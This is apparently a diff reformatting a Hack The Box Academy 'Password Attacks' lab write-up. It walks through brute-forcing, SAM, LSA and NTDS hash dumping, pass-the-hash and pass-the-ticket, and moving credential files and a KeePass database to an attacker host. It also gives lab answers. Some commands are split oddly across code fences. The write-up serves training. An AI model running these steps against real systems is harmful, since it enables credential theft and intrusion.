@@ -80,8 +80,8 @@ and then we will be requested to enter the password.
 For windows – we will use xfreerdp with the command:
 ```bash
 xfreerdp /v:<Target IP> /u:<username> /p:<password>
-```
 /dynamic-resolution
+```
 
 Throughout the module, those steps will be referred as 'login to the
 Linux/Windows target machine'.
@@ -106,8 +106,8 @@ first we need to obtain credentials, we will use crackmapexec, we will
 ```bash
 run on the pwnbox the command:
 crackmapexec winrm <target-IP> -u username.list -p
-```
 password.list | grep '+'
+```
 to bruteforce the WinRM service for credentials. We will use the default
 wordlists, and grep for the '+' character – indicating successful hit:
 
@@ -221,9 +221,8 @@ after a minute or 2:
 We get the credentials chris:789456123.
 Lets run xfree RDP:
 ```bash
-xfreerdp /v:<Target IP> /u:chris /p:789456123 /dynamic-
+xfreerdp /v:<Target IP> /u:chris /p:789456123 /dynamic-resolution
 ```
-resolution
 we will be propted for confirmation, enter 'Y', and we are at chris's rdp
 desktop:
 
@@ -272,8 +271,8 @@ flooding the terminal, either way we have the credentials: cassie:12345678910
 Ok now that we have the credentials – lets obtain the shares list:
 ```bash
 crackmapexec smb <target-IP> -u "cassie" -p "12345678910" --
-```
 shares
+```
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/password-attacks/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -345,8 +344,8 @@ contain far more values than the original list.
 To mutate our password list we will use the hashcat command:
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort
-```
 -u > mut_password.list
+```
 and we will get the output file 'mut_password.list'.
 running line count ('wc -l') on that file will reveal:
 
@@ -448,7 +447,7 @@ cat smb/flag.txt
 
 ### Password Reuse / Default Passwords
 
-> **Lab Question (Page 11)**: Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: <username>:<password>)
+> **Lab Question (Page 11)**: Use the user's credentials we found in the previous section and find out the credentials for MySQL. Submit the credentials as the answer. (Format: `<username>`:`<password>`)
 >
 > **Flag / Answer**: `superdba:admin`
 {: .prompt-info }
@@ -470,7 +469,7 @@ credentials takes us in to the mysql.
 First we will ssh login to 'sam' account via the previous obtained credentials
 and the same method.
 Once in, we run the command
-mysql -u <user> -p<password>
+mysql -u `<user>` -p`<password>`
 *pay attention there is no space between the '-p'  and the password. *
 Ok lets test the first three options:
 
@@ -552,9 +551,8 @@ different way used on the Windows Privilege Escalation writeup equivalent task
 (page 124)).
 On the pwnbox, we will run the command:
 ```bash
-sudo python3 /usr/share/doc/python3-
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ./
 ```
-impacket/examples/smbserver.py -smb2support CompData ./
 where './' is the pwnbox user's home directory, and 'CompData' is the name of
 the share:
 
@@ -568,9 +566,9 @@ the share:
 Now our share is up and running, when there are incoming files, incoming
 uploads will be displayed.
 On the target machine, we run the commands:
-move SAM \\<attacker-IP>\CompData
-move SECURITY \\<attacker-IP>\CompData
-move SYSTEM \\<attacker-IP>\CompData
+move SAM \\`<attacker-IP>`\CompData
+move SECURITY \\`<attacker-IP>`\CompData
+move SYSTEM \\`<attacker-IP>`\CompData
 the command will move the files from bob's documents folder (where they
 were saved), to the share – where they are essentially uploaded to the attacker
 machine:
@@ -600,10 +598,9 @@ And when done, we can confirm with 'ls S*' (look for all files which begin with
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-python3 /usr/share/doc/python3-
-```
-impacket/examples/secretsdump.py -sam SAM -security SECURITY
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -security SECURITY
 -system SYSTEM LOCAL
+```
 
 
 We are looking for the NTLM hash of 'ITbackdoor', which is marked at the
@@ -613,8 +610,8 @@ Method 2:
 we will use crackmapexec:
 ```bash
 crackmapexec smb <target-IP> --local-auth -u bob -p
-```
 HTB_@cademy_stdnt! --sam
+```
 *the user's credentials are built in on the command. *:
 
 The ITbackdoor NTLM hash is marked, right at the end.
@@ -650,8 +647,8 @@ Answer: frontdesk:Password123
 Method: we will use crackmapexec, similar command to the hash dumping:
 ```bash
 crackmapexec smb <target-IP> --local-auth -u bob -p
-```
 HTB_@cademy_stdnt! --lsa
+```
 the difference is here we have the '--lsa' for gettings the credentials:
 
 *
@@ -717,11 +714,10 @@ we did in 'Attacking SAM' section (the steps will not be repeated here, but full
 details refer to that section), but here are the necessary transfer commands:
 Server:
 ```bash
-sudo python3 /usr/share/doc/python3-
-```
-impacket/examples/smbserver.py -smb2support CompData ./
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ./
 Client:
-move lsass.dmp \\<attacker-IP>\CompData
+move lsass.dmp \\`<attacker-IP>`\CompData
+```
 
 when the file is transferred – it will be on the attacking pwnbox:
 
@@ -959,12 +955,11 @@ NTDS.dit and SYSTEM from the target machine to the attacking pwnbox:
 
 Server:
 ```bash
-sudo python3 /usr/share/doc/python3-
-```
-impacket/examples/smbserver.py -smb2support CompData ./
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ./
 Client:
-move C:\NTDS\NTDS.bit \\<attacker-IP>\CompData
-move C:\NTDS\NTDS.bit \\<attacker-IP>\CompData
+move C:\NTDS\NTDS.bit \\`<attacker-IP>`\CompData
+```
+move C:\NTDS\NTDS.bit \\`<attacker-IP>`\CompData
 
 when transferred – the file will be on the attacking pwnbox:
 
@@ -1175,8 +1170,8 @@ We will put the the original password in a file called 'password.txt', and outpu
 the mutated passwords list to mut_password.txt. we will use the command:
 ```bash
 hashcat --force password.txt -r custom.rule --stdout | sort
-```
 -u > mut_password.txt
+```
 and here is the start of the output mutated passwords file:
 
 ![Figure 34.1 — Lab execution and output verification (Page 34)](/assets/images/posts/htb-academy/password-attacks/p034_01.png)
@@ -1322,8 +1317,8 @@ We will also required the resources folder, containing the password.list and the
 custom.rule. in the pwnbox we will run:
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort
-```
 -u > mut_password.list
+```
 to create the mut_password.list (the same one we made in previous relevant
 sections)
 
@@ -1368,8 +1363,8 @@ So lets login to WinRM service using 'evil-WinRM' tool, with pass the hash. We
 will log in with the command:
 ```bash
 evil-winrm -i <target-IP> -u Administrator -H
-```
 30B3783CE2ABF1AF70F77D0660CF3453
+```
 
 ![Figure 40.1 — Lab execution and output verification (Page 40)](/assets/images/posts/htb-academy/password-attacks/p040_01.jpg)
 *_Figure 40.1 — Lab execution and output verification (Page 40)_*
@@ -1415,8 +1410,8 @@ First lets try to RDP to the target machine without setting
 'DisableRestrictedAdmin' value to 0, we will use the command:
 ```bash
 xfreerdp /v:<target-IP> /u:Administrator
-```
 /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
+```
 we will get this error message:
 
 Ok lets evil-WinRM to the machine, set the 'DisableRestrictedAdmin' to 0 (with
@@ -1508,9 +1503,9 @@ open cmd on 'C:\tools', and run mimikatz command with the provided hash of
 Julio (from the section) with the commands:
 ```bash
 mimikatz.exe privilege::debug "sekurlsa::pth /user:julio
-```
 /rc4:64F12CDDAA88057E06A81B54E73B949B
 /domain:inlanefreight.htb /run:cmd.exe" exit
+```
 *the hash of Julio is already provided for us in the section. *
 When we run the command, a new cmd terminal will be opened, lets run:
 dir \\dc01\julio
@@ -1578,7 +1573,7 @@ Now as established above, MS01 has 2 interfaces, we need the interface of the
 network with the 'DC01', that would be Ethernet1 interface, therefore the
 attacker IP is '172.16.1.5'.
 Time to create the reverse shell payload, we will go to
-https://www.revshells.com/, and create the payload according those
+`https://www.revshells.com/, and create the payload according those`
 specifications:
 
 The IP is the secondary network attacker IP (MS01 IP), and the port 4444
@@ -1663,7 +1658,7 @@ impacket-psexec john@<target-IP> -hashes
 
 The shares are not writables, access denied.
 Lets try another impacket tool – wmiexec:
-wmiexec.py john@<target-IP> -hashes
+wmiexec.py john@`<target-IP>` -hashes
 :c4b0e1b10c7ce2c4723b4e2407ef81a2
 
 
@@ -1673,8 +1668,8 @@ Again, no luck.
 Now, lets try the evil-WinRM, we will use the command
 ```bash
 evil-winrm -i <target-IP> -u john -H
-```
 c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
 
 
 We are in. evil-winRM works.
@@ -1821,7 +1816,7 @@ In here we don't get the output as files but directly to the terminal:
 
 What we care about is the 'Base64EncodedTicket'
 We will use to to import Ticket, We will proceed with the command:
-.\Rubeus.exe ptt /ticket:<Base64EncodedTicket>
+.\Rubeus.exe ptt /ticket:`<Base64EncodedTicket>`
 
 ![Figure 54.1 — Lab execution and output verification (Page 54)](/assets/images/posts/htb-academy/password-attacks/p054_01.jpg)
 *_Figure 54.1 — Lab execution and output verification (Page 54)_*
@@ -1941,8 +1936,8 @@ machine 'LINUX01' is provided for us in '/opt' directory as
 We will run the command:
 ```bash
 python3 /opt/keytabextract.py
-```
 /opt/specialfiles/carlos.keytab
+```
 *where '/opt/specialfiles/carlos.keytab' is the file with the user read&write
 pemission found in the previous question. *:
 
@@ -2029,8 +2024,8 @@ The .sh script will attempt to Kerberos authenticate as 'svc_workstations' – a
 if successful it puts the TGT in a cache (command 1), then – it will attempt to
 ```bash
 use the cached TGT to smb connect to dc01, and put the 'ls' content in the
-```
 'script-test-results' file.
+```
 
 Well the sh script makes me wonder what else in the '.scripts' directory:
 ```bash
@@ -2059,8 +2054,8 @@ python3 /opt/keytabextract.py .scripts/svc_workstations.kt
 
 ```bash
 python3 /opt/keytabextract.py
-```
 .scripts/svc_workstations._all.kt
+```
 
 
 The NTLM hash is in 'svc_workstations._all.kt'
@@ -2091,8 +2086,8 @@ Running it in crackstation:
 lets begin with checking 'svc_workstations' sudo rights:
 ```bash
 sudo -l
-```
 enter 'svc_workstations' password at prompt:
+```
 
 We have 'ALL' rights, meaning we can do (almost) everything, within the
 'LINUX01' target machine.
@@ -2510,8 +2505,8 @@ before we crack, we will need a passwordlist, lets get the passwords from the
 resources folder, and generate the mutated password list with the command:
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort
-```
 -u > mut_password.list
+```
 it is the same procedure done before regarding the mutated passwords list.
 
 Once that we have that, we may start cracking using 'john the ripper', using the
@@ -2558,8 +2553,8 @@ Lets try to bruteforce the ftp service with the resources folder usernames and
 passwords. We will use the command:
 ```bash
 hydra -L username.list -P password.list ftp://<target-IP> -t
-```
 48
+```
 
 ![Figure 76.1 — Lab execution and output verification (Page 76)](/assets/images/posts/htb-academy/password-attacks/p076_01.jpg)
 *_Figure 76.1 — Lab execution and output verification (Page 76)_*
@@ -2579,7 +2574,7 @@ It tells us we need a public key, this ssh service will not accept passwords.
 So lets get a public key.
 Lets ftp (which stands for File Transfer Protocol) with his account, we will use
 the commands:
-ftp -n <target-IP>
+`ftp -n <target-IP>`
 user mike
 then we enter his password:
 
@@ -2768,8 +2763,8 @@ zip2john Docs.zip > Docs.hash
 we will generate the mutated password list required for the cracking:
 ```bash
 hashcat --force password.list -r custom.rule --stdout | sort
-```
 -u > mut_password.list
+```
 
 and begin cracking
 ```bash
@@ -3055,16 +3050,16 @@ command.
 
 ```bash
 crackmapexec smb <target-IP> -u usernames.txt -p
-```
 mut_password.list | grep '+'
+```
 and after several moment we will get credentials!
 
 The credentials of johanna are 'johanna:1231234!'.
 Now, looking at what smb shares johanna can inspect:
 ```bash
 crackmapexec smb <target-IP> -u "johanna" -p "1231234!" --
-```
 shares
+```
 
 ```bash
 smbclient -U johanna \\\\<target-IP>\\IPC$
@@ -3086,9 +3081,8 @@ smbclient -U johanna \\\\<target-IP>\\IPC$
 #### Technical Methodology & Exploit Execution:
 
 ```bash
-xfreerdp /v:<target-IP> /u:johanna /p:1231234! /dynamic-
+xfreerdp /v:<target-IP> /u:johanna /p:1231234! /dynamic-resolution
 ```
-resolution
 and we are in:
 
 Lets open the file explorer:
@@ -3188,7 +3182,7 @@ powershell upload script:
 ### Lets confirm
 
 $filePath = ".\Logins.kdbx"
-$targetUrl = "http://<attacker-IP>:8080/upload"
+$targetUrl = "http://`<attacker-IP>`:8080/upload"
 # Create a WebClient object
 $webClient = New-Object System.Net.WebClient
 $webClient.Headers.Add("filename",
@@ -3199,7 +3193,7 @@ $WebClient.Headers.Add("X-Atlassian-Token", "nocheck")
 $WebClient.UploadFile($targetUrl, (Get-Location).Path + "\"
 + $filePath)
 Write-Output "File uploaded successfully"
-*make sure to change the <attacker-IP> to the pwnbox or other attacker IP . *
+*make sure to change the `<attacker-IP>` to the pwnbox or other attacker IP . *
 
 After some numbers going..
 
@@ -3268,9 +3262,8 @@ evil-winrm -i <target-IP> -u david -p gRzX7YbeTcDG7
 ```
 
 ```bash
-xfreerdp /v:<target-IP> /u:david /p:gRzX7YbeTcDG7 /dynamic-
+xfreerdp /v:<target-IP> /u:david /p:gRzX7YbeTcDG7 /dynamic-resolution
 ```
-resolution
 
 ![Figure 98.1 — Lab execution and output verification (Page 98)](/assets/images/posts/htb-academy/password-attacks/p098_01.jpg)
 *_Figure 98.1 — Lab execution and output verification (Page 98)_*
@@ -3289,8 +3282,8 @@ Access denied for both..
 Lets try smb connect – first lets take a look at the shares:
 ```bash
 crackmapexec smb <target-IP> -u "david" -p "gRzX7YbeTcDG7" -
-```
 -shares
+```
 
 
 We have read access to 'david' share (which johanna hasn't) – lets enter it and
@@ -3485,9 +3478,8 @@ Here they are on the home's directory:
 
 Lets use secretsdump to extract the hashes:
 ```bash
-python3 /usr/share/doc/python3-
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM
 ```
-impacket/examples/secretsdump.py -sam SAM -system SYSTEM
 LOCAL
 
 
@@ -3519,8 +3511,8 @@ The Administrator's password is 'Liverp00l8!'
 Lets RDP login to the Administrator:
 ```bash
 xfreerdp /v:<target-IP> /u:Administrator /p:Liverp00l8!
-```
 /dynamic-resolution
+```
 
 
 Here is our flag!
